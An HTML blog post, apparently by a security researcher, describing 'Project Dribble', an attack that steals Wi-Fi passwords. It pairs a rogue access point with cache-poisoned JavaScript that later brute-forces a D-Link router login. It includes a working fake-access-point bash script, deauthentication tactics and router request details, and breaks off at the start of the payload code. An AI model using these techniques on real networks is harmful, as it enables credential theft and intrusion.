@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="@font-face {   font-family: &quot;Harry&quot;;   src: url(&#x2F;fonts&#x2F;hp.ttf) format(&quot;truetype&quot;); }   I’ve been meaning to work on this little project for quite some time, but life got in the way and I was always t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Project Dribble: hacking Wi-Fi with cached JavaScript">
+<meta property="og:url" content="https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/index.html">
+<meta property="og:site_name" content="rhaidiz">
+<meta property="og:description" content="@font-face {   font-family: &quot;Harry&quot;;   src: url(&#x2F;fonts&#x2F;hp.ttf) format(&quot;truetype&quot;); }   I’ve been meaning to work on this little project for quite some time, but life got in the way and I was always t">
+<meta property="og:locale">
+<meta property="og:image" content="https://rhaidiz.net/images/dlink.png">
+<meta property="og:image" content="https://rhaidiz.net/images/HIMYM-small.png">
+<meta property="og:image" content="https://rhaidiz.net/images/bettercap.png">
+<meta property="og:image" content="https://rhaidiz.net/images/final.png">
+<meta property="article:published_time" content="2018-10-25T00:00:00.000Z">
+<meta property="article:modified_time" content="2022-02-14T12:00:40.400Z">
+<meta property="article:author" content="rhaidiz">
+<meta property="article:tag" content="Wi-Fi">
+<meta property="article:tag" content="cache-poison">
+<meta property="article:tag" content="wifi">
+<meta property="article:tag" content="cache">
+<meta property="article:tag" content="bettercap">
+<meta property="article:tag" content="raspberry">
+<meta property="article:tag" content="rpi">
+<meta property="article:tag" content="node.js">
+<meta property="article:tag" content="hostapd">
+<meta property="article:tag" content="dnsmasq">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rhaidiz.net/images/dlink.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Project Dribble: hacking Wi-Fi with cached JavaScript</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://dblp.uni-trier.de/pers/hd/m/Meo:Federico_De">Academic</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/02/27/dribble-router-vulns-dlink-alcatel-cve-2019-6969-cve-2019-6968-cve-2019-7163/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&text=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&is_video=false&description=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Project Dribble: hacking Wi-Fi with cached JavaScript&body=Check out this article: https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&name=Project Dribble: hacking Wi-Fi with cached JavaScript&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-create-a-fake-access-point"><span class="toc-number">1.1.</span> <span class="toc-text">How to create a fake access point</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-force-people-to-connect-to-it"><span class="toc-number">1.2.</span> <span class="toc-text">How to force people to connect to it</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Scenario-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Scenario 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Scenario-2"><span class="toc-number">1.2.2.</span> <span class="toc-text">Scenario 2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-and-inject-the-malicious-payload"><span class="toc-number">1.3.</span> <span class="toc-text">Create and inject the malicious payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Same-Origin-Policy"><span class="toc-number">1.3.1.</span> <span class="toc-text">Same-Origin-Policy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X-Frame-Options"><span class="toc-number">1.3.2.</span> <span class="toc-text">X-Frame-Options</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Let%E2%80%99s-test-it-out-%E2%80%A6-for-real-%E2%80%A6-almost"><span class="toc-number">2.</span> <span class="toc-text">Let’s test it out … for real … almost!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wrapping-up"><span class="toc-number">3.</span> <span class="toc-text">Wrapping up</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Project Dribble: hacking Wi-Fi with cached JavaScript
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rhaidiz</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-10-25T00:00:00.000Z" itemprop="datePublished">2018-10-25</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Wi-Fi/" rel="tag">Wi-Fi</a>, <a class="tag-link-link" href="/tags/bettercap/" rel="tag">bettercap</a>, <a class="tag-link-link" href="/tags/cache/" rel="tag">cache</a>, <a class="tag-link-link" href="/tags/cache-poison/" rel="tag">cache-poison</a>, <a class="tag-link-link" href="/tags/dnsmasq/" rel="tag">dnsmasq</a>, <a class="tag-link-link" href="/tags/hostapd/" rel="tag">hostapd</a>, <a class="tag-link-link" href="/tags/node-js/" rel="tag">node.js</a>, <a class="tag-link-link" href="/tags/raspberry/" rel="tag">raspberry</a>, <a class="tag-link-link" href="/tags/rpi/" rel="tag">rpi</a>, <a class="tag-link-link" href="/tags/wifi/" rel="tag">wifi</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <style>
+@font-face {
+  font-family: "Harry";
+  src: url(/fonts/hp.ttf) format("truetype");
+}
+</style>
+
+<p>I’ve been meaning to work on this little project for quite some time, but life got in the way and I was always too busy. Now I finally got some time back for myself and I’m here talking about it.</p>
+<p>Quite some time ago I checked out the Wireless LAN Security Megaprimer course by Vivek Ramachandran (very nice, highly recommended) and incidentally in the same period I was doing some traveling which meant I got to stay in different hotels all providing Wi-Fi.  Needless to say, my brain started to go crazy and I’ve thus been thinking about “unconventional” ways to get Wi-Fi passwords.</p>
+<blockquote>
+<p>Can’t turn my brain off, you know.<br>It’s me.</p>
+<p>We go into some place,<br>and all I can do is see the angles.<br>– <cite>Danny Ocean (Ocean’s Twelve)</cite></p>
+</blockquote>
+<p>The idea that I’m about to describe is pretty simple and, probably, not that new either. Nevertheless it was a fun way for me to get my hands dirty and play around with my Raspberry Pi which has been sitting on the shelf for too long.</p>
+<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The idea is to steal Wi-Fi passwords by exploiting web browser’s cache. Since I needed to come up with a name for the project, I first developed it and than named it “Dribble” :-). Dribble creates a fake Wi-Fi access point and waits for clients to connect to it. When clients connect, dribble intercepts every HTTP requests performed to JavaScript pages and injects in the responses a malicious JavaScript code.  The headers of the new response are altered too so that the malicious JavaScript code is cached and forced to persist in the browser. When the client disconnects from the fake access point and reconnects back to, say, its home routers, the malicious JavaScript code activates, steals the Wi-Fi password from the router and send it back to the attacker.<br>Pretty straightforward, right?</p>
+<p>In order to achieve this result I had to figure out these three things:</p>
+<ol>
+<li>How to create a fake access point</li>
+<li>How to force people to connect to it</li>
+<li>What should the malicious JavaScript code do to steal passwords from routers</li>
+</ol>
+<h3 id="How-to-create-a-fake-access-point"><a href="#How-to-create-a-fake-access-point" class="headerlink" title="How to create a fake access point"></a>How to create a fake access point</h3><p>This is pretty simple, it was also covered in the Wireless LAN Security Megaprimer and there are a number of different github repositories and gists that one can use to get started and create a fake access point. I thus won’t go too much into details but for the sake of completeness let’s discuss the one I used. I used <code>hostapd</code> to create the Wi-Fi access point, <code>dnsmasq</code> as a DHCP server and DNS relay server and <code>iptables</code> to create the NAT network. The bash script that follows will create a very simple Wi-Fi access point not protected by any password. I put some comments in the code that I hope will improve readability.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># the internet interface</span><br><span class="line">internet=eth0</span><br><span class="line"></span><br><span class="line"># the wifi interface</span><br><span class="line">phy=wlan0</span><br><span class="line"></span><br><span class="line"># The ESSID</span><br><span class="line">essid=&quot;TEST&quot;</span><br><span class="line"></span><br><span class="line"># bring interfaces up</span><br><span class="line">ip link set dev $internet up</span><br><span class="line">ip link set dev $phy up</span><br><span class="line"></span><br><span class="line">##################</span><br><span class="line"># DNSMASQ</span><br><span class="line">##################</span><br><span class="line">echo &quot;</span><br><span class="line">interface=$phy</span><br><span class="line"></span><br><span class="line">bind-interfaces</span><br><span class="line"></span><br><span class="line"># Set default gateway</span><br><span class="line">dhcp-option=3,10.0.0.1</span><br><span class="line"></span><br><span class="line"># Set DNS servers to announce</span><br><span class="line">dhcp-option=6,10.0.0.1</span><br><span class="line"></span><br><span class="line">dhcp-range=10.0.0.2,10.0.0.10,12h</span><br><span class="line"></span><br><span class="line">no-hosts</span><br><span class="line"></span><br><span class="line">no-resolv</span><br><span class="line">log-queries</span><br><span class="line">log-facility=/var/log/dnsmasq.log</span><br><span class="line"></span><br><span class="line"># Upstream DNS server</span><br><span class="line">server=8.8.8.8</span><br><span class="line">server=8.8.4.4</span><br><span class="line"></span><br><span class="line">&quot; &gt; tmp-dnsmasq.conf</span><br><span class="line"></span><br><span class="line"># start dnsmasq which provides DNS relaying service</span><br><span class="line">dnsmasq --conf-file=tmp-dnsmasq.conf</span><br><span class="line"></span><br><span class="line">##################</span><br><span class="line"># IPTABLES</span><br><span class="line">##################</span><br><span class="line"></span><br><span class="line"># Enable Internet connection sharing</span><br><span class="line"># configuring ip forwarding</span><br><span class="line">echo &#x27;1&#x27; &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"></span><br><span class="line"># configuring NAT</span><br><span class="line">iptables -A FORWARD -i $internet -o $phy -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i $phy -o $internet -j ACCEPT</span><br><span class="line">iptables -t nat -A POSTROUTING -o $internet -j MASQUERADE</span><br><span class="line"></span><br><span class="line">##################</span><br><span class="line"># HOSTAPD</span><br><span class="line">##################</span><br><span class="line">echo &quot;ctrl_interface=/var/run/hostapd</span><br><span class="line"></span><br><span class="line">interface=$phy</span><br><span class="line"></span><br><span class="line"># ESSID</span><br><span class="line">ssid=$essid</span><br><span class="line"></span><br><span class="line">driver=nl80211</span><br><span class="line">auth_algs=3</span><br><span class="line">channel=11</span><br><span class="line">hw_mode=g</span><br><span class="line"></span><br><span class="line"># all mac addresses allowed</span><br><span class="line">macaddr_acl=0</span><br><span class="line"></span><br><span class="line">wmm_enabled=0&quot; &gt; tmp-hotspot.conf</span><br><span class="line"></span><br><span class="line"># Start hostapd in screen hostapd</span><br><span class="line">echo &quot;Start hostapd in screen hostapd&quot;</span><br><span class="line">screen -dmS hostapd hostapd tmp-hotspot.conf</span><br></pre></td></tr></table></figure>
+
+<h3 id="How-to-force-people-to-connect-to-it"><a href="#How-to-force-people-to-connect-to-it" class="headerlink" title="How to force people to connect to it"></a>How to force people to connect to it</h3><p><strong>DISCLAIMER:</strong> I left this section intentionally at a high-level of description without any code for different reasons. However, if it gets enough attention and people are interested about it, I will probably extend it with a more in-depth discussion providing, perhaps, some code and practical guide.<br><br /></p>
+<p>Depending on your target there might be different ways to try and get someone to connect to a fake access point. Let’s discuss two scenarios:</p>
+<h4 id="Scenario-1"><a href="#Scenario-1" class="headerlink" title="Scenario 1"></a>Scenario 1</h4><p>In this case the target is connected to a password protected Wi-Fi, perhaps the same password protected Wi-Fi the attacker is trying to access. There are a couple of things to try in this case, but first let me discuss something interesting about how Wi-Fi works. The beloved 802.11 standard has many interesting features, one of which I’ve always found … amusing. The 802.11 defines a special packet that, regardless of the encryption, the password, the infrastructure or anything at all, if sent to a client will simply disconnect that client from the access point. If you send it once, the client will disconnect and immediately reconnect, and the end user won’t even notice that something happened. However, if you keep sending it, the client will eventually give up meaning you can actually jamming the Wi-Fi connection and the user will notice that he’s not connected to the access point anymore. By abusing this characteristic, you can simply force a client to disconnect from the legitimate access point it is connected to. At this point two things can be done:</p>
+<ol>
+<li>The attacker can create a fake access point with the same ESSID of the access point the target was connected to, but without a password. In this case the attacker should hope that once the user realizes his not connected to the access point, he would try to manually connect again. The target will thus find two networks with the same ESSID, one will have a locker while the other one won’t. The user might try to connect to the one with the locker first, which won’t work because the attacker it jamming it, and chances are that he might also try the one without the locker … after all it has the same name of the one he wants so badly to connect to … right??</li>
+</ol>
+<ol start="2">
+<li>Another interesting behavior that can be exploited, is that whenever a client is not connected to an access point, it keeps sending beacon packets looking for previously known ESSIDs. If the target had connected to an unprotected access point, and chances are that he did, the attacker can simply create a fake access point with the same ESSID of the unprotected access point visited by the target. As a result, the client will happily connect to the fake access point.</li>
+</ol>
+<h4 id="Scenario-2"><a href="#Scenario-2" class="headerlink" title="Scenario 2"></a>Scenario 2</h4><p>In this case the target is not connected to any Wi-Fi access point, maybe because the target is a smartphone and the owner is walking on the street. However, chances are, that the Wi-Fi card is still turned on and the device is still looking for known Wi-Fi ESSIDs. Once again, as discussed previously, chances are that the target had connected to an unprotected Wi-Fi access point. Thus the attacker can just create a fake access point with the ESSID of an access point the target had connected to and just like before, the Wi-Fi client will happily connect to the fake access point.</p>
+<h3 id="Create-and-inject-the-malicious-payload"><a href="#Create-and-inject-the-malicious-payload" class="headerlink" title="Create and inject the malicious payload"></a>Create and inject the malicious payload</h3><p>Now comes the “slightly newer” part (at least for me): figure out what the malicious JavaScript code should do to access the router and steal the Wi-Fi password. Remember that the victim will be connected to the fake access point which obviously gives the attacker quite some advantage, but still there are a couple of things to consider.</p>
+<p>As a target router to attack, I used my home Wi-Fi router, specifically a D-Link DVA-5592 which was (not so) freely provided by my ISP. Unfortunately, for the time being, I don’t have other devices that I can test, so I have to make due with it.</p>
+<p>Let’s now discuss the malicious JavaScript code. The goal is to have it performing requests to the router, meaning that it has to perform requests to a local IP address. This should already call for keywords such as <code>Same-Origin-Policy</code> and <code>X-Frame-Option</code>.</p>
+<h4 id="Same-Origin-Policy"><a href="#Same-Origin-Policy" class="headerlink" title="Same-Origin-Policy"></a>Same-Origin-Policy<a name="back1"></a></h4><p>Let me borrow the definition from MDN web docs:</p>
+<blockquote>
+<p>The same-origin policy is a critical security mechanism that restricts how a document or script loaded from one origin can interact with a resource from another origin. It helps to isolate potentially malicious documents, reducing possible attack vectors. <cite><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy</a></cite></p>
+</blockquote>
+<p>In other words: if domain A contains JavaScript code, that JavaScript code can only access information within domain A (<a href="#ack1">*</a>). It cannot access information from domain B.</p>
+<h4 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h4><p>Let me again borrow the definition from MDN web docs:</p>
+<blockquote>
+<p>The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <code>&lt;frame&gt;</code>, <code>&lt;iframe&gt;</code> or <code>&lt;object&gt;</code> . Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites. <cite><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</a></cite></p>
+</blockquote>
+<p>That’s pretty straightforward: the <code>X-Frame-Options</code> is used to prevent pages from being loaded in an <code>iframe</code>.</p>
+<p>So let’s see the response that we get from requesting the login page of the D-Link:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 24 Oct 2018 16:20:21 UTC</span><br><span class="line">Server: HTTP Server</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Keep-Alive: timeout=15, max=15</span><br><span class="line">Last-Modified: Thu, 23 Aug 2018 08:59:55 UTC</span><br><span class="line">Cache-Control: must-revalidate, private</span><br><span class="line">Expires: -1</span><br><span class="line">Content-Language: en</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 182</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=/ui/status&quot;&gt;</span><br><span class="line">&lt;/head&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>The response contains <code>X-Frame-Options</code> set to <code>DENY</code> (thanks god) meaning that if I was hoping to load it in an <code>iframe</code>, I just cannot. Moreover, since the malicious JavaScript code will be injected in a different domain than the one of the router, the <code>Same-Origin-Policy</code> will prevent any interaction with the router itself. The simple solution I came up with, and beware it might not be the only one, is the following:</p>
+<p>The injection consists of two different JavaScript code. The first JavaScript code will add an <code>iframe</code> inside the infected page. The <code>src</code> parameter of the <code>iframe</code> will point to the router’s IP address. As already said, the router’s IP address has the <code>X-Frame-Options</code> set to <code>DENY</code> so the <code>iframe</code> won’t be able to load the router’s page. However, when the JavaScript code that creates the <code>iframe</code> executes, the victim is still connected to the fake access point (remember the advantage point I mentioned earlier?). Which means that the request to the router’s IP address will be handled by the fake access point … how convenient. The fake access point can thus intercepts any request performed towards the router’s IP address and respond with a web page that:</p>
+<ol>
+<li>contains a second JavaScript code that will actually perform the requests to the real router,</li>
+<li>doesn’t have the <code>X-Frame-Options</code> header,</li>
+<li>includes headers to cache the page.</li>
+</ol>
+<p>Since the fake access point poses as the legitimate router, the browser will cache a page for which the domain is the router’s IP address thus bypassing both the <code>Same-Origin-Policy</code> and the <code>X-Frame-Options</code>. Finally, once the infected client connects back to its home router:</p>
+<ol>
+<li>the first JavaScript code will add an <code>iframe</code> pointing the router’s IP address,</li>
+<li>the <code>iframe</code> will load a cached version of the router’s home page containing the second malicious JavaScript,</li>
+<li>the second malicious JavaScript will attack the router.</li>
+</ol>
+<p>The first malicious JavaScript is pretty simple, it just has to append an <code>iframe</code>. The second malicious JavaScript is a little bit trickier as it has to perform multiple HTTP requests to brute-force the login, access the page with the Wi-Fi password and send it back to the attacker.<br><br/><br>In the case of the D-Link, the login request looks like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /ui/login HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.1.1/ui/login</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 141</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">userName=admin&amp;language=IT&amp;login=Login&amp;userPwd=e8864[REDACTED]6df0c1bf8&amp;nonce=558675225&amp;code1=nwdeLUh</span><br></pre></td></tr></table></figure>
+
+<p>The important parameters here are:</p>
+<ul>
+<li><code>userName</code> which is <code>admin</code> (shocking);</li>
+<li><code>userPwd</code> which looks encrypted;</li>
+<li><code>nonce</code> which is definitely related to the encrypted password.</li>
+</ul>
+<p>Diving in the source code of the login page I almost immediately noticed this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.form.userPwd.value = CryptoJS.HmacSHA256(document.form.origUserPwd.value, document.form.nonce.value);</span><br></pre></td></tr></table></figure>
+
+<p>Which means that the login requires the CryptoJS library and takes the nonce from <code>document.form.nonce.value</code>. With this information I can easily create a small JavaScript code that takes an array of usernames and passwords and attempts to brute-force the log in page.</p>
+<p>Once inside the router, I need to look around for the location where I can retrieve the Wi-Fi password. The current firmware in the D-Link DVA-5592 shows the Wi-Fi password IN PLAINTEXT (oh boy) right after the login in the dashboard page. </p>
+<p><img src="/images/dlink.png"><br>At this point all I need to do is to access the HTML of the page, get the Wi-Fi password and send it somewhere to collect. Let’s now dive into the actual JavaScript code tailored for the D-Link. I included comments so you can follow what’s happening.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 